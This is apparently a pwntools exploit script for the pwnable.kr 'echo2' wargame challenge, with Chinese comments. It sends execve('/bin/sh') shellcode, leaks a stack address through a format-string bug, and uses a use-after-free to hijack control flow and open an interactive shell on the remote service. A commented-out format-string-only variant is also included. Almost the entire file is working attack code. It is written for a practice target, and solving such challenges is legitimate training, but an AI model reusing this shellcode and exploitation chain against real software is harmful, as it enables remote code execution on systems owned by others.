from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('./echo2')

# p = process('./echo2')
p = remote('pwnable.kr', '9011')
pause()

# 小于24个字节的shellcode
shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
p.sendlineafter(b': ', shellcode)

# 仅利用格式化字符串漏洞，数据量比较大，下策
# p.sendlineafter(b'> ', b'2')
# p.sendlineafter(b'\n', b'%3$p')
# target_chunk = int(p.recvline()[2:], 16) - 0x45
# print(hex(target_chunk))

# payload = fmtstr_payload(6, {target_chunk+0x30: target_chunk+0x10}, write_size='int')
# print(payload, len(payload))
# p.sendlineafter(b'> ', b'2')
# p.sendlineafter(b'\n', payload)

# 综合利用格式化字符串漏洞和UAF漏洞
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'\n', b'%10$p')
name_addr = int(p.recvline()[2:], 16) - 0x20
print(hex(name_addr))

payload = b'a' * 0x18 + p64(name_addr)
p.sendlineafter(b'> ', b'4')
p.sendlineafter(b'(y/n)', b'n')
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'\n', payload)

p.interactive()
